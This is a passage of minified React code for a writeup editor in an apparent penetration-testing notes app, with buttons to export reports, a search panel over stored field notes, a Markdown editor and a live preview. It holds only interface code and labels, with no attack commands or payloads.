transition-all shadow-glow-cyan/20",title:"Generate print-ready Executive Penetration Testing Report",children:[e.jsx(de,{className:"w-3.5 h-3.5"}),e.jsx("span",{children:"Executive Report"})]}),!!(r!=null&&r.officialWalkthrough)&&e.jsxs("button",{onClick:()=>{if(!r.officialWalkthrough)return;const t=`

---

## 🛡️ Official Hack The Box Walkthrough & Intelligence
${r.officialWalkthrough}
`,u=l+t;m(u),b(r.id,{writeupMarkdown:u}),i&&F("engage")},className:"flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyber-emerald/15 border border-cyber-emerald/40 hover:border-cyber-emerald text-cyber-emerald hover:bg-cyber-emerald hover:text-black text-xs font-bold transition-all shadow-sm",title:"Append official Hack The Box Walkthrough & Intelligence to this writeup",children:[e.jsx(ce,{className:"w-3.5 h-3.5"}),e.jsx("span",{children:"+ Official HTB Intel"})]}),e.jsxs("button",{onClick:Q,className:"flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyber-card border border-cyber-border hover:border-cyber-emerald text-cyber-emerald font-bold text-xs hover:bg-cyber-emerald/10 transition-all",title:"Export raw Markdown (.md) formatted for Obsidian or GitBook",children:[e.jsx(pe,{className:"w-3.5 h-3.5"}),e.jsx("span",{children:"Export .md"})]}),e.jsxs("button",{onClick:J,className:"flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyber-emerald text-black font-bold text-xs hover:bg-cyber-emerald/90 transition-all shadow-glow-emerald",title:"Export self-contained, air-gapped HTML writeup report with 1-click Print to PDF",children:[e.jsx(be,{className:"w-3.5 h-3.5"}),e.jsx("span",{children:"Export HTML"})]})]})]}),v&&e.jsxs("div",{className:"p-4 rounded-xl border border-purple-500/40 bg-cyber-card/95 shadow-2xl space-y-3 font-mono",children:[e.jsxs("div",{className:"flex items-center justify-between border-b border-cyber-border pb-2.5",children:[e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx(G,{className:"w-4 h-4 text-purple-400"}),e.jsx("span",{className:"font-bold text-white text-xs tracking-wider",children:"TACTICAL INTEL // QUICK REFERENCE & INSERT"}),e.jsxs("span",{className:"text-[10px] px-2 py-0.5 rounded bg-purple-500/20 text-purple-300 font-mono",children:[x.length," MATCHES (MAX 20)"]})]}),e.jsx("button",{type:"button",onClick:()=>h(!1),className:"p-1 rounded text-cyber-muted hover:text-slate-900 dark:hover:text-white",children:e.jsx(me,{className:"w-4 h-4"})})]}),e.jsxs("div",{className:"relative",children:[e.jsx(ue,{className:"w-3.5 h-3.5 text-cyber-muted absolute left-3 top-2.5"}),e.jsx("input",{type:"text",id:"writeup-notes-search",name:"writeup-notes-search","aria-label":"Search field manual notes and commands",value:S,onChange:t=>s(t.target.value),placeholder:"Search field manual notes & commands (e.g. kerberoast, suid, lfi, bloodhound)...",className:"w-full bg-cyber-bg border border-cyber-border rounded-lg pl-8 pr-3 py-1.5 text-xs text-slate-900 dark:text-white placeholder-cyber-muted focus:outline-none focus:border-purple-400"})]}),e.jsx("div",{className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3 max-h-72 overflow-y-auto pr-1",children:x.length===0?e.jsx("div",{className:"col-span-full p-4 text-center text-xs text-cyber-muted",children:"No matching field manual notes found."}):x.map(t=>e.jsxs("div",{className:"p-3 rounded-lg bg-cyber-bg border border-cyber-border hover:border-purple-500/50 transition-all space-y-2 flex flex-col justify-between",children:[e.jsxs("div",{className:"space-y-1",children:[e.jsxs("div",{className:"flex items-center justify-between gap-1",children:[e.jsx("span",{className:"font-bold text-slate-900 dark:text-white text-xs truncate",title:t.title,children:t.title}),e.jsx("span",{className:"text-[9px] px-1.5 py-0.2 rounded bg-purple-500/15 text-purple-300 border border-purple-500/30 flex-shrink-0 font-mono",children:t.difficulty})]}),e.jsx("div",{className:"text-[10px] text-cyber-muted line-clamp-2",children:t.summary||t.subCategory})]}),t.commands&&t.commands.length>0&&e.jsx("div",{className:"p-1.5 rounded bg-black/50 border border-cyber-border/70 font-mono text-[10px] text-cyber-cyan truncate",children:q(t.commands[0],{...g,targetIp:(r==null?void 0:r.ip)||g.targetIp})}),e.jsxs("div",{className:"flex items-center justify-between gap-2 pt-1 border-t border-cyber-border/50",children:[e.jsx("span",{className:"text-[9px] text-cyber-muted font-mono truncate",children:t.category}),e.jsxs("button",{type:"button",onClick:()=>B(t),className:"flex items-center gap-1 px-2.5 py-1 rounded bg-purple-500/20 hover:bg-purple-500 hover:text-black border border-purple-500/40 text-purple-300 text-[10px] font-bold transition-all",title:"Insert this note and commands into active writeup",children:[e.jsx(fe,{className:"w-3 h-3"}),e.jsx("span",{children:"Insert"})]})]})]},t.id))})]}),e.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-2 gap-4 items-stretch min-h-[calc(100vh-250px)]",children:[e.jsxs("div",{className:"flex flex-col rounded-xl border border-cyber-border bg-cyber-card overflow-hidden shadow-lg",children:[e.jsxs("div",{className:"flex items-center justify-between border-b border-cyber-border px-4 py-2.5 bg-cyber-bg/70 text-xs",children:[e.jsxs("span",{className:"font-bold text-slate-900 dark:text-white flex items-center gap-2",children:[e.jsx(V,{className:"w-4 h-4 text-cyber-cyan"})," RAW MARKDOWN (YAML & BODY)"]}),e.jsxs("span",{className:"text-[10px] text-cyber-muted",children:[l.length," chars · ",l.split(`
`).length," lines"]})]}),e.jsx("textarea",{id:"writeup-markdown-editor",name:"writeup-markdown-editor","aria-label":"Markdown report editor",value:l,onChange:Y,onBlur:H,placeholder:"Write your penetration testing report or paste notes here...",className:"flex-1 w-full p-4 bg-cyber-bg text-cyber-text font-mono text-xs focus:outline-none resize-none leading-relaxed overflow-y-auto",spellCheck:!1})]}),e.jsxs("div",{className:"flex flex-col rounded-xl border border-cyber-border bg-cyber-card overflow-hidden shadow-lg",children:[e.jsxs("div",{className:"flex items-center justify-between border-b border-cyber-border px-4 py-2.5 bg-cyber-bg/70 text-xs",children:[e.jsxs("span",{className:"font-bold text-slate-900 dark:text-white flex items-center gap-2",children:[e.jsx(xe,{className:"w-4 h-4 text-cyber-emerald"})," LIVE RENDERED PREVIEW"]}),e.jsxs("span",{className:"text-[10px] text-cyber-emerald font-semibold flex items-center gap-1",children:[e.jsx(G,{className:"w-3 h-3"})," OBSIDIAN PREVIEW"]})]}),e.jsx("div",{className:"flex-1 p-5 overflow-y-auto max-h-[calc(100vh-280px)] bg-cyber-card/40",children:ee(l)})]})]}),e.jsx(we,{machine:r||a[0]||null,isOpen:I,onClose:()=>M(!1)})]})};export{Le as WriteupStudio};
